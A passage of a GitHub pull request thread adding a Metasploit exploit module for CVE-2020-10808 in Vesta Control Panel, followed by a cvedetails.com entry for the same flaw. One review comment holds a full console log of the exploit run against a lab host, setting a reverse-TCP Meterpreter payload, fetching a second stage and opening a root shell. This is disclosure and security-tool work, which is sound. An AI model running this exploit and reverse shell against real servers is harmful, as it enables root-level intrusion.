nightmare as most likely someone will have to go back through the log file and clean out their entires by hand, which could take a long time if the log file is particularly large. |
| --- | --- | --- |

 üëç
2
 wvu and mdisec reacted with thumbs up emoji

All reactions

* üëç
  2 reactions

Sorry, something went wrong.

[![@wvu](https://avatars.githubusercontent.com/u/4551878?s=80&u=99426fa1baf3d6e40a669942251d846cf81a9c25&v=4)](/wvu)

Copy link

Contributor

### **[wvu](/wvu)** commented [Apr 11, 2020](#issuecomment-612529155) ‚Ä¢ edited Loading

| ~~Haven't looked much at this module, but `ARTIFACTS_ON_DISK` might also be warranted.~~ No, `CONFIG_CHANGES` is suitable for this, as suggested. Disregard. :) |
| --- |

All reactions

Sorry, something went wrong.

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Fixed 2nd round of suggested changes](/rapid7/metasploit-framework/pull/13094/commits/706a395bc0e4cdb04c39c8ad746dc4821a5cf240 "Fixed 2nd round of suggested changes")`

`[706a395](/rapid7/metasploit-framework/pull/13094/commits/706a395bc0e4cdb04c39c8ad746dc4821a5cf240)`

 [![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)
[mdisec](/mdisec)
requested a review
from [gwillcox-r7](/gwillcox-r7)
[April 13, 2020 08:22](#event-3226330489)

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Apr 13, 2020](#issuecomment-612804886)

| [@gwillcox-r7](https://github.com/gwillcox-r7) It has been a while since I haven't got that kind of detailed review of my PRs on msf project ! Thank you very much. Much appreciated ü§òüèª  Let me know if you wanna see additional improvements and changes. |
| --- |

 ‚ù§Ô∏è
3
 gwillcox-r7, wvu, and mirhatx reacted with heart emoji

All reactions

* ‚ù§Ô∏è
  3 reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 13, 2020](#issuecomment-612905557)

| Confirmed that the Notes section has been updated correctly. This was not part of the review comments so I can't mark it as completed, but it looks good now üëç |
| --- |

All reactions

Sorry, something went wrong.

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Fixed documentation and login method](/rapid7/metasploit-framework/pull/13094/commits/b7a1fbdde2b8981fd604af5d065d7650babef185 "Fixed documentation and login method")`

`[b7a1fbd](/rapid7/metasploit-framework/pull/13094/commits/b7a1fbdde2b8981fd604af5d065d7650babef185)`

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Apr 13, 2020](#issuecomment-612963704)

| Thank [@gwillcox-r7](https://github.com/gwillcox-r7). Let me know if I missed any of your comments that I need to fix. |
| --- |

 üëç
1
 gwillcox-r7 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 13, 2020](#issuecomment-612967221)

| @mmetince New changes look good! |
| --- |

 üëç
1
 mdisec reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
approved these changes
[Apr 13, 2020](#pullrequestreview-392339195)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13094/files/b7a1fbdde2b8981fd604af5d065d7650babef185)

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Looks good, will need to make some edits for grammar and spelling but rest should be fine. Will also need to do some additional testing just to make sure some of the new logic additions work. Should land this soon though!

Sorry, something went wrong.

 ‚ù§Ô∏è
2
 wvu and mdisec reacted with heart emoji

All reactions

* ‚ù§Ô∏è
  2 reactions

 [![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
[force-pushed](/rapid7/metasploit-framework/compare/74664e4e10e77bd47ed47ccf4e8282bc8c328f47..b7a1fbdde2b8981fd604af5d065d7650babef185)
the
vestacp\_exec

branch
2 times, most recently
from
[`74664e4`](/rapid7/metasploit-framework/commit/74664e4e10e77bd47ed47ccf4e8282bc8c328f47) to
[`b7a1fbd`](/rapid7/metasploit-framework/commit/b7a1fbdde2b8981fd604af5d065d7650babef185)  [Compare](/rapid7/metasploit-framework/compare/74664e4e10e77bd47ed47ccf4e8282bc8c328f47..b7a1fbdde2b8981fd604af5d065d7650babef185)
[April 13, 2020 21:14](#event-3228597724)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7)

`[Fix up clarity and spelling issues in module and documentation](/rapid7/metasploit-framework/pull/13094/commits/c151b93ba4eafad7f8e75f248bd8a44510ba8b39 "Fix up clarity and spelling issues in module and documentation")`

`[c151b93](/rapid7/metasploit-framework/pull/13094/commits/c151b93ba4eafad7f8e75f248bd8a44510ba8b39)`

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 13, 2020](#issuecomment-613113684)

| Hello @mmetince I made some minor changes to your exploit in [c151b93](https://github.com/rapid7/metasploit-framework/commit/c151b93ba4eafad7f8e75f248bd8a44510ba8b39) to help improve some grammar and spelling issues and updated some output lines and comments to make things a bit easier for the end user to understand. The following is the output from testing it after these changes were made, showing that the exploit is still working as expected:  ``` msf5 > use exploit/linux/http/vestacp_exec  msf5 exploit(linux/http/vestacp_exec) > info         Name: Vesta Control Panel Authenticated Remote Code Execution      Module: exploit/linux/http/vestacp_exec    Platform: Python        Arch: python  Privileged: Yes     License: Metasploit Framework License (BSD)        Rank: Excellent   Disclosed: 2020-03-17  Provided by:   Mehmet Ince <mehmet@mehmetince.net>  Module side effects:  ioc-in-logs  config-changes  Module stability:  crash-safe  Module reliability:  first-attempt-fail  Available targets:   Id  Name   --  ----   0   Automatic  Check supported:   No  Basic options:   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   PASSWORD                    yes       The password to login with   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'   RPORT      8083             yes       The target port (TCP)   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0   SRVPORT    8080             yes       The local port to listen on.   SSL        true             no        Negotiate SSL/TLS for outgoing connections   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)   TARGETURI  /                yes       The URI of the vulnerable instance   URIPATH                     no        The URI to use for this exploit (default is random)   USERNAME                    yes       The username to login as   VHOST                       no        HTTP server virtual host  Payload information:  Description:   This module exploits an authenticated command injection    vulnerability in the v-list-user-backups bash script file in Vesta    Control Panel to gain remote code execution as the root user.  References:   https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/   https://cvedetails.com/cve/CVE-2020-10808/  msf5 exploit(linux/http/vestacp_exec) > set USERNAME tester USERNAME => tester msf5 exploit(linux/http/vestacp_exec) > set PASSWORD tester PASSWORD => tester msf5 exploit(linux/http/vestacp_exec) > set RHOSTS 192.168.205.130 RHOSTS => 192.168.205.130 msf5 exploit(linux/http/vestacp_exec) > set SRVHOST 192.168.205.1 SRVHOST => 192.168.205.1 msf5 exploit(linux/http/vestacp_exec) > set SRVPORT 9090 SRVPORT => 9090 msf5 exploit(linux/http/vestacp_exec) > set PAYLOAD python/meterpreter/reverse_tcp PAYLOAD => python/meterpreter/reverse_tcp msf5 exploit(linux/http/vestacp_exec) > show options  Module options (exploit/linux/http/vestacp_exec):     Name       Current Setting  Required  Description    ----       ---------------  --------  -----------    PASSWORD   tester           yes       The password to login with    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS     192.168.205.130  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT      8083             yes       The target port (TCP)    SRVHOST    192.168.205.1    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0    SRVPORT    9090             yes       The local port to listen on.    SSL        true             no        Negotiate SSL/TLS for outgoing connections    SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)    TARGETURI  /                yes       The URI of the vulnerable instance    URIPATH                     no        The URI to use for this exploit (default is random)    USERNAME   tester           yes       The username to login as    VHOST                       no        HTTP server virtual host   Payload options (python/meterpreter/reverse_tcp):     Name   Current Setting  Required  Description    ----   ---------------  --------  -----------    LHOST                   yes       The listen address (an interface may be specified)    LPORT  4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Automatic   msf5 exploit(linux/http/vestacp_exec) > set LHOST 192.168.205.1 LHOST => 192.168.205.1 msf5 exploit(linux/http/vestacp_exec) > set LPORT 3443 LPORT => 3443 msf5 exploit(linux/http/vestacp_exec) > exploit [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. msf5 exploit(linux/http/vestacp_exec) >  [*] Started reverse TCP handler on 192.168.205.1:3443  [*] 192.168.205.130:8083 - Using URL: http://192.168.205.1:9090/aGLWKLje [*] 192.168.205.130:8083 - Second payload download URI is http://192.168.205.1:9090/aGLWKLje [+] 192.168.205.130:21 - Successfully authenticated to the FTP service [+] 192.168.205.130:21 - The file with the payload in the file name has been successfully uploaded. [*] 192.168.205.130:8083 - Retrieving cookie and csrf token values [+] 192.168.205.130:8083 - Cookie and CSRF token values successfully retrieved [*] 192.168.205.130:8083 - Authenticating to HTTP Service with given credentials [*] 192.168.205.130:8083 - Starting scheduled backup. Exploitation may take up to 5 minutes. [+] 192.168.205.130:8083 - Scheduled backup has been started !  [*] 192.168.205.130:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.205.130:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.205.130:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.205.130:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [*] 192.168.205.130:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz... [+] 192.168.205.130:8083 - First stage is executed ! Sending 2nd stage of the payload [*] Sending stage (53755 bytes) to 192.168.205.130 [*] Meterpreter session 1 opened (192.168.205.1:3443 -> 192.168.205.130:33644) at 2020-04-13 16:40:07 -0500 [+] 192.168.205.130:8083 - Payload appears to have executed in the background. Enjoy the shells <3  msf5 exploit(linux/http/vestacp_exec) > sessions -i 1 [*] Starting interaction with 1...  meterpreter > getuid Server username: root meterpreter > shell Process 20220 created. Channel 1 created. /bin/sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) #   ``` |
| --- |

 ‚ù§Ô∏è
2
 wvu and mdisec reacted with heart emoji

All reactions

* ‚ù§Ô∏è
  2 reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
merged commit [`3c64b8f`](/rapid7/metasploit-framework/commit/3c64b8fde9ffeaee56a6b4758d88dac3eb77da74)
into
rapid7:master

[Apr 13, 2020](https://github.com/rapid7/metasploit-framework/pull/13094#event-3228723676)

 [![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)
[mdisec](/mdisec)
deleted the
vestacp\_exec

branch
[April 13, 2020 22:05](#event-3228732822)

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Apr 13, 2020](#issuecomment-613120949)

| Awesome ! Thank you very much for all of your effort on this PR, [@gwillcox-r7](https://github.com/gwillcox-r7) ü§òüèª |
| --- |

 üëç
1
 gwillcox-r7 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 13, 2020](#issuecomment-613122093) ‚Ä¢ edited by tperry-r7 Loading

| Release Notes A new module, `modules/exploits/linux/http/vestacp_exec` was added that exploits [CVE-2020-10808](https://attackerkb.com/topics/3KD0ssm6Ii/cve-2020-10808?referrer=msfReleaseNotes), an authenticated command injection vulnerability within the `v-list-user-backups` script of Vesta Control Panel 0.9.8-26 and prior. Successful exploitation results in remote code execution as the `root` user. |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 13, 2020](#issuecomment-613122297)

| No problem @mmetince :) |
| --- |

All reactions

Sorry, something went wrong.

[![@wvu](https://avatars.githubusercontent.com/u/4551878?s=80&u=99426fa1baf3d6e40a669942251d846cf81a9c25&v=4)](/wvu)

Copy link

Contributor

### **[wvu](/wvu)** commented [Apr 13, 2020](#issuecomment-613125822)

| Amazing collaboration. Great work, guys! |
| --- |

 üöÄ
2
 gwillcox-r7 and mdisec reacted with rocket emoji

All reactions

* üöÄ
  2 reactions

Sorry, something went wrong.

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)
[mdisec](/mdisec)
mentioned this pull request
[Apr 16, 2020](#ref-pullrequest-601080627)

[Added Python stager format without a space
#13263](/rapid7/metasploit-framework/pull/13263)
 Merged

[![@tperry-r7](https://avatars.githubusercontent.com/u/54866039?s=40&u=60da3ad54d9c907286f7eaa69b9d6c87aa6b2fde&v=4)](/tperry-r7)
[tperry-r7](/tperry-r7)
added
the
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
label
[Apr 29, 2020](#event-3285145339)

[![@margo-gru](https://avatars.githubusercontent.com/u/65300619?s=80&v=4)](/margo-gru)

Copy link

### **[margo-gru](/margo-gru)** commented [May 13, 2020](#issuecomment-628084794)

| I'm getting error exploiting. Current configuration and error is [image](https://user-images.githubusercontent.com/65300619/81835960-77f27980-9560-11ea-9ae1-284243f70650.png) I've given all necessary options. Can you please help me ? |
| --- |

All reactions

Sorry, something went wrong.

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=80&u=1fe0601f243e1627c6f738027d2e71b90dad989d&v=4)](/bcoles)

Copy link

Contributor

### **[bcoles](/bcoles)** commented [May 13, 2020](#issuecomment-628086549)

| [@margo-gru](https://github.com/margo-gru) please create a [new issue](https://github.com/rapid7/metasploit-framework/issues/new/choose). Please also ensure you provide the relevant stack trace(s) from `framework.log`. |
| --- |

All reactions

Sorry, something went wrong.

[![@margo-gru](https://avatars.githubusercontent.com/u/65300619?s=40&v=4)](/margo-gru)
[margo-gru](/margo-gru)
mentioned this pull request
[May 13, 2020](#ref-issue-617609231)

[Exploit failed: ArgumentError wrong number of arguments
#13452](/rapid7/metasploit-framework/issues/13452)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13094)

Reviewers

[![@acammack-r7](https://avatars.githubusercontent.com/u/16652544?s=40&v=4)](/acammack-r7) [acammack-r7](/acammack-r7)

acammack-r7 left review comments

[![@wvu](https://avatars.githubusercontent.com/u/4551878?s=40&v=4)](/wvu) [wvu](/wvu)

wvu left review comments

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=40&v=4)](/bcoles) [bcoles](/bcoles)

bcoles left review comments

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7) [gwillcox-r7](/gwillcox-r7)

gwillcox-r7 approved these changes

Assignees

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7) [gwillcox-r7](/gwillcox-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[easy](/rapid7/metasploit-framework/labels/easy)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

10 participants

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=52&v=4)](/mdisec) [![@ccondon-r7](https://avatars.githubusercontent.com/u/40408740?s=52&v=4)](/ccondon-r7) [![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=52&v=4)](/gwillcox-r7) [![@wvu](https://avatars.githubusercontent.com/u/4551878?s=52&v=4)](/wvu) [![@margo-gru](https://avatars.githubusercontent.com/u/65300619?s=52&v=4)](/margo-gru) [![@bcoles](https://avatars.githubusercontent.com/u/434827?s=52&v=4)](/bcoles) [![@acammack-r7](https://avatars.githubusercontent.com/u/16652544?s=52&v=4)](/acammack-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=52&v=4)](/bwatters-r7) [![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=52&v=4)](/space-r7) [![@tperry-r7](https://avatars.githubusercontent.com/u/54866039?s=52&v=4)](/tperry-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from cvedetails.com_e25e423c_20250119_142640.html ===

[Documentation](/documentation/ "User guide and product documentation")

[Documentation](/documentation/ "User guide and product documentation")

* [Log in](/sign-in "Login")

[![](/img/ssc-logo.svg "SecurityScorecard")
CVEdetails.com](/ "Go to cvedetails.com homepage")
[powered by SecurityScorecard](https://securityscorecard.com?utm_source=cvedetails)

Vulnerabilities

[By Date](/browse-by-date.php "Browse security vulnerabilities by date")
[By Type](/vulnerabilities-by-types.php "Vulnerability distribution by type")
[Known Exploited](/cisa-known-exploited-vulnerabilities/kev-1.html "Vulnerabilities in the CISA Known Exploited Vulnerabilities (KEV) catalog")
[Assigners](/cve-assigners-cnas/1.html "CVE sources, assigners")
[CVSS Scores](/cvss-score-charts.php "CVSS score distribution report")
[EPSS Scores](/epss/epss-score-history.html?delta=110 "EPSS score change history")
[Search](/vulnerability-search.php "Vulnerability search")

Vulnerable Software

[Vendors](/vendor.php "Browse software and hardware vendors")
[Products](/product-list.php "Browse software and hardware products")
[Version Search](/version-search.php "Search for product versions")

Vulnerability Intel.

[Newsfeed](/data/list "Newsfeed, things you need to know, most recent first")
[Open Source Vulns](/osv/ecosystem/list "Vulnerabilities in open source projects and ecosystems")
[Emerging CVEs](/data/emerging-CVEs "CVEs discovered in other sources but not yet published")
[Feeds](/feed-aggregator/feed-list "RSS feed aggregator")
[Exploits](/exploit/list "Exploits from exploit-db, packetstorm and metasploit")
[Advisories](/advisory/list "Security advisories from vendors and other sources like github")
[Code Repositories](/code/repositories "Monitored open source repositories")
[Code Changes](/code/changes "Source code changes related to security issues and CVEs")

Attack Surface

[My Attack Surface](/asi/my-attack-surface "External attack surface summary for my organization")
[Digital Footprint](/asi/my-digital-footprint "Digital footprint of my organization")
[Discovered Products](/asi/discovered-products "Products discovered on my attack surface by scanners")
[Detected Vulns](/asi/detected-vulns "Vulnerabilities detected on my attack surface by scanners")
[IP Search](/asi/ip-details "Search for an IP address")

Other

[Metasploit Modules](/metasploit-modules/1.html "Metasploit modules and related CVEs")
[CWE Definitions](/cwe-definitions/ "CWE definitions")
[CAPEC Definitions](/capec-definitions/ "CAPEC definitions")
[Articles](https://securityscorecard.com/research/?utm_source=cvedetails "Featured research articles from SecurityScorecard")
[Blog](https://securityscorecard.com/blog/?utm_source=cvedetails "SecurityScorecard blog")

# Vulnerability Details : [CVE-2020-10808](/cve/CVE-2020-10808/ "CVE-2020-10808 security vulnerability details")

 Public exploit exists!

Vesta Control Panel (VestaCP) through 0.9.8-26 allows Command Injection via the schedule/backup Backup Listing Endpoint. The attacker must be able to create a crafted filename on the server, as demonstrated by an FTP session that renames .bash\_logout to a .bash\_logout' substring followed by shell metacharacters.

Published
2020-03-22 17:15:11
Updated
2023-02-03 19:29:56
Source
[MITRE](/vulnerability-list/assigner-1/MITRE.html "CVEs created by MITRE")

View at

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-10808 "Vulnerability details at NVD"),

[CVE.org](https://www.cve.org/CVERecord?id=CVE-2020-10808 "Vulnerability details at CVE project")

## Products affected by CVE-2020-10808

* [Vestacp](/vendor/15494/Vestacp.html "Details for Vestacp") ¬ª [Vesta Control Panel](/version-list/15494/31935/1/Vestacp-Vesta-Control-Panel.html "Vestacp Vesta Control Panel versions list")  Versions up to, including, (<=) 0.9.8-26cpe:2.3:a:vestacp:vesta\_control\_panel:\*:\*:\*:\*:\*:\*:\*:\* [Matching versions](/version-search.php?cpeMatchCriteriaId=ee9d7641-8915-477c-8e5a-658dd23e098a "Matching product versions")

## Exploit prediction scoring system (EPSS) score for CVE-2020-10808

[EPSS FAQ](/epss/faq.html "Exploit Prediction Scoring System (EPSS) FAQ")

92.85%
Probability of exploitation activity in the next 30 days
[EPSS Score History](/epss/CVE-2020-10808/epss-score-history.html "Exploit Prediction Scoring System (EPSS) score history for CVE-2020-10808")

~ 99 %

Percentile, the proportion of vulnerabilities that are scored at or less

## Metasploit modules for CVE-2020-10808

* ##### Vesta Control Panel Authenticated Remote Code Execution

  Disclosure Date: 2020-03-17
  First seen: 2020-04-26

  exploit/linux/http/vestacp\_exec

  This module exploits an authenticated command injection vulnerability in the v-list-user-backups
  bash script file in Vesta Control Panel to gain remote code execution as the root user.
  Authors:
  - Mehmet Ince <mehmet@mehmetince.net>

  [More information](https://www.rapid7.com/db/modules/exploit/linux/http/vestacp_exec "More details - external link")

## CVSS scores for CVE-2020-10808

| Base Score | Base Severity | CVSS Vector | Exploitability Score | Impact Score | Score Source | First Seen |
| --- | --- | --- | --- | --- | --- | --- |
| 9.0 | HIGH | AV:N/AC:L/Au:S/C:C/I:C/A:C | 8.0 | 10.0 | NIST |  |
| Access Vector: NetworkAccess Complexity: LowAuthentication: SingleConfidentiality Impact: CompleteIntegrity Impact: CompleteAvailability Impact: Complete | | | | | | |
| 8.8 | HIGH | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 2.8 | 5.9 | NIST |  |
| Attack Vector: NetworkAttack Complexity: LowPrivileges Required: LowUser Interaction: NoneScope: UnchangedConfidentiality: HighIntegrity: HighAvailability: High | | | | | | |

## CWE ids for CVE-2020-10808

* [CWE-78 Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](/cwe-details/78/Improper-Neutralization-of-Special-Elements-used-in-an-OS-Co.html "CWE-78 - CWE definition")

  The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.
  Assigned by:
  nvd@nist.gov (Primary)

## References for CVE-2020-10808

* [http://packetstormsecurity.com/files/157111/Vesta-Control-Panel-Authenticated-Remote-Code-Execution.html](http://packetstormsecurity.com/files/157111/Vesta-Control-Panel-Authenticated-Remote-Code-Execution.html "Open reference url in new window - External link")
  Vesta Control Panel Authenticated Remote Code Execution ‚âà Packet Storm Exploit;Third Party Advisory;VDB Entry
* [https://github.com/rapid7/metasploit-framework/pull/13094](https://github.com/rapid7/metasploit-framework/pull/13094 "Open reference url in new window - External link")
  Adding Vesta Control Panel Remote Code Execution 0day by mmetince ¬∑ Pull Request #13094 ¬∑ rapid7/metasploit-framework ¬∑ GitHub Patch;Third Party Advisory
* [https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/](https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/ "Open reference url in new window - External link")
  Vesta Control Panel Second Order Remote Code Execution 0day Step-by-Step Analysis ‚Äì Pentest Blog Exploit;Third Party Advisory
* [http://packetstormsecurity.com/files/157219/Vesta-Control-Panel-Authenticated-Remote-Code-Execution.html](http://packetstormsecurity.com/files/157219/Vesta-Control-Panel-Authenticated-Remote-Code-Execution.html "Open reference url in new window - External link")
  Vesta Control Panel Authenticated Remote Code Execution ‚âà Packet Storm Exploit;Third Party Advisory;VDB Entry
* [https://forum.vestacp.com/viewforum.php?f=25](https://forum.vestacp.com/viewforum.php?f=25 "Open reference url in new window - External link")
  Updates - Vesta Control Panel - Forum Release Notes;Vendor Advisory

Jump to
CVE Summary
Affected Products
EPSS Score
Metasploit Modules
CVSS Scores
CWEs
References

[About](/about-contact.php "About cvedetails.com")
[Terms of Use](/terms-and-conditions.php)
[Privacy Policy](/privacy.php)
[CVE Help](/cve-help.php "Help topics and more information about CVE")
[FAQ](/faq.php "Frequently asked questions")
[How it works](/how-does-it-work.php "Known limitations & technical details")

![](/img/ssc-logo.svg "SecurityScorecard")

SecurityScorecard

1140 Avenue of the Americas

19th Floor

New York, NY 10036

info@securityscorecard.io

United States: (800) 682-1707

International: +1(646) 809-2166

[Products](https://securityscorecard.com/product/?utm_source=cvedetails "SecurityScorecard products. Security ratings, automated assessments, and guidance")

[Solutions](https://securityscorecard.com/solutions?utm_source=cvedetails "SecurityScorecard Cybersecurity Risk Rating & Third-Party Risk Management Solutions")

[Customers](https://securityscorecard.com/customers/?utm_source=cvedetails "SecurityScorecard customers")

[Marketplace](https://platform.securityscorecard.io/#/marketplace?utm_source=cvedetails "SecurityScorecard Marketplace. Apps integrations and partners")

[Partners](https://securityscorecard.com/partners/?utm_source=cvedetails "SecurityScorecard partners")

[Resources](https://securityscorecard.com/resources/?utm_source=cvedetails "SecurityScorecard case studies, reports, ebooks and more resources")

[Company](https://securityscorecard.com/company/?utm_source=cvedetails "SecurityScorecard company and organization")

[Trust Portal](https://securityscorecard.com/trust/?utm_source=cvedetails "SecurityScorecard trust portal. Transparency into ratings methodology, insights into how it aligns with industry standards")

[Security Ratings](https://securityscorecard.com/security-rating?utm_source=cvedetails "SecurityScorecard security ratings")

[Login](https://platform.securityscorecard.io/#/start?utm_source=cvedetails "SecurityScorecard platform login")

[Blog](https://securityscorecard.com/blog/?utm_source=cvedetails "SecurityScorecard blog")

[Contact](https://securityscorecard.com/company/contact-us/?utm_source=cvedetails "Contact SecurityScorecard")

[Careers](https://securityscorecard.com/company/careers/?utm_source=cvedetails "SecurityScorecard careers")

[Feedback](https://support.securityscorecard.com?utm_source=cvedetails "Feedback")

This product uses data from the NVD API but is not endorsed or certified by the NVD.
See [NVD website](http://nvd.nist.gov "National vulnerability database web site - External link ") for more information.
CVE is a registred trademark of the MITRE Corporation and the authoritative source of CVE content is
[MITRE's CVE web site](http://cve.mitre.org/).
CWE is a registred trademark of the MITRE Corporation and the authoritative source of CWE content is
[MITRE's CWE web site](http://cwe.mitre.org/).
OVAL is a registered trademark of The MITRE Corporation and the authoritative source of OVAL content is
[MITRE's OVAL web site](http://oval.mitre.org).

This web site uses cookies for managing your session, storing preferences, website analytics and additional purposes
described in our [privacy policy](/privacy.php).

By using this web site you are agreeing to CVEdetails.com
[terms of use](/terms-and-conditions.php)!

Accept
Close



=== Content from attackerkb.com_db5459ea_20250119_142640.html ===


[![](/static/public/img/logo-condensed-dark.png)
![](/static/public/img/logo-dark.png)
A Rapid7 Project](/)

* [Activity Feed](/activity-feed)
* [Topics](/topics)
* [About](/about)
* [Leaderboard](/leaderboard)

[Log In](/login)

![](/static/private/img/attacker-value/dark/attacker-value-0.svg)

Attacker Value
##### Unknown

0

### CVE-2020-10808

0

## CVE ID

